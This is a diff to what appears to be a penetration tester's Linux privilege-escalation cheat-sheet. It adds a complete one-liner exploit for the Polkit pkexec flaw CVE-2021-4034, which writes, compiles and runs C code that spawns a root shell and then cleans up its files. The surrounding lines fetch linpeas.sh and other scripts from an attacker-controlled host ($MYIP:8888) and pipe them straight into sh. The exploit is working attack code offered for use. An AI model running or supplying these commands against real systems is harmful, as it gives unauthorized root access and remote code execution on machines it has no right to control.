@@ -1350,6 +1350,9 @@ wget -qO- http://$MYIP:8888/linux/linpeas.sh | sh
 +---------- Priv Check ----------+
 curl -s http://$MYIP:8888/whoami.sh | sh
 
++---------- Polkit (CVE-2021-4034) ----------+
+echo $'F=-Wall\n\nT=$(shell which true)\n\n.PHONY: all\nall: m.so run gconv-modules gconvpath\n\n.PHONY: clean\nclean:\n\trm -rf m.so run gconv-modules GCONV_PATH=./\n\ngconv-modules:\n\techo "module UTF-8// PWN// m 1" > $@\n\n.PHONY: gconvpath\ngconvpath:\n\tmkdir -p GCONV_PATH=.\n\tcp $(T) GCONV_PATH=./m.so:.\n\nm.so: m.c\n\t$(CC) $(F) --shared -fPIC -o $@ $<\n' >Makefile; echo $'#include <unistd.h>\nint main(){char * const e[]={"m.so:.","PATH=GCONV_PATH=.","SHELL=/x","CHARSET=PWN",NULL};return execve("/usr/bin/pkexec",NULL,e);}' >run.c; echo $'#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid gconv(){}\nvoid gconv_init(void *p){char * const a[]={"/bin/sh",NULL};char * const e[]={"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",NULL};setuid(0);setgid(0);execve(a[0],a,e);exit(0);}' >m.c; make; ./run; rm gconv-modules Makefile m.c m.so run run.c; rm -rf GCONV_PATH=.
+
 +---------- Full Privesc Scan ----------+
 curl -s http://$MYIP:8888/linux/linpeas.sh | sh
 
